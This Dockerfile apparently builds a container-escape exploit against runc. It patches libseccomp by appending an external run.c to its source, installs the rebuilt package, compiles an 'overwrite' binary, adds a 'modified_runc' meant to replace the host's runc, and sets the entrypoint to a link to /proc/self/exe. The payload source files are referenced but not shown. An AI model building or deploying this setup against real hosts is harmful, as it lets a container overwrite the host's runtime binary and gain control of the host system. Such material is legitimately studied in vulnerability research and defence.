FROM ubuntu:18.04

# Get the required libraries
RUN set -e -x ;\
    sed -i 's,# deb-src,deb-src,' /etc/apt/sources.list ;\
    apt -y update ;\
    apt-get -y install build-essential ;\
    cd /root ;\
    apt-get -y build-dep libseccomp ;\
    apt-get source libseccomp

# Append the run function to the libseccomp-2.3.1/src/api.c file and build
ADD run.c /root/run.c
RUN set -e -x ;\
    cd /root/libseccomp-* ;\
    cat /root/run.c >> src/api.c ;\
    DEB_BUILD_OPTIONS=nocheck dpkg-buildpackage -b -uc -us ;\
    dpkg -i /root/*.deb

# Add overwrite.c, run and compile
ADD overwrite.c /root/overwrite.c
RUN set -e -x ;\
    cd /root ;\
    gcc overwrite.c -o /overwrite

# Add the modified_runc file (replacement of the original runc after the execution of the exploit)
ADD modified_runc /root/modified_runc

# Link to /proc/self/exe
RUN set -e -x ;\
    ln -s /proc/self/exe /entrypoint
ENTRYPOINT [ "/entrypoint" ]
